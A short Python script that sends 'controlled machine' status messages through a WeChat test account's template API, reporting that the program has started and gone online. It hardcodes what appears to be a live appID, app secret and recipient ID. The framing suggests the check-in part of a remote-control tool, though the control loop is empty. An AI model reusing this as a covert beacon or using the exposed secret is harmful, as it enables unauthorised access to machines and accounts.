"""

"""
import json
import requests
import platform

class WeChat_push:
    """
    微信测试号推送被控信息
    """
    def __init__(self):
        # 从测试号信息获取
        self.appID = ""
        self.appSecret = ""

        # 收信人ID即 用户列表中的微信号，
        self.openId = ""


        # 发送信息模板
        self.Vehicle_Submission_id = "V8uPyRsGUGYCzUnsyPlpuYWAjNUg0OjSD3ALmvTlrhE"
    def get_access_token(self):
        # 获取access token的url
        url = 'https://api.weixin.qq.com/cgi-bin/token?grant_type=client_credential&appid={}&secret={}' \
            .format(self.appID.strip(), self.appSecret.strip())
        response = requests.get(url).json()
        # print(response)
        access_token = response.get('access_token')
        return access_token
    def send_Alleged_information(self, access_token, message):      # 发送被控信息
        body = {
            "touser": self.openId,
            "template_id": self.Vehicle_Submission_id.strip(),
            "url": "https://weixin.qq.com",
            "data": {
                "message": {
                    "value": message
                },
            }
        }
        url = 'https://api.weixin.qq.com/cgi-bin/message/template/send?access_token={}'.format(access_token)
        print(requests.post(url, json.dumps(body)).text)
        ...
    def Alleged_information(self, message):
        # 1.获取access_token
        access_token = self.get_access_token()
        # 3. 发送消息
        self.send_Alleged_information(access_token, message)
    def send_to_the_user(self, access_token, num_openid, message):
        body = {
            "touser": num_openid,
            "template_id": self.Vehicle_Submission_id.strip(),
            "url": "https://weixin.qq.com",
            "data": {
                "message": {
                    "value": message
                },
            }
        }
        url = 'https://api.weixin.qq.com/cgi-bin/message/template/send?access_token={}'.format(access_token)
        print(requests.post(url, json.dumps(body)).text)
        ...

class Main:
    def __init__(self):
        self.wechat_push = WeChat_push()
        # 初始化配置
        self.wechat_push.appID = 'wxfe87182bd1371294'
        self.wechat_push.appSecret = '7a6e5a3f118f1f3317f57fb065e7c06a'
        self.wechat_push.openId = 'ogur66Me6Rpbfg6vx7RvUKgGO8AY'

        self.system = platform.system()
        self.sys_Version = platform.release()
        self.running = True
        ...

    def Run(self):
        try:
            print(self.system)
            self.wechat_push.Alleged_information("程序（启动-联网）成功")
        except Exception as t:
            print(t)
            ...
        while self.running:

            ...

if __name__ == '__main__':
    m = Main()
    m.Run()
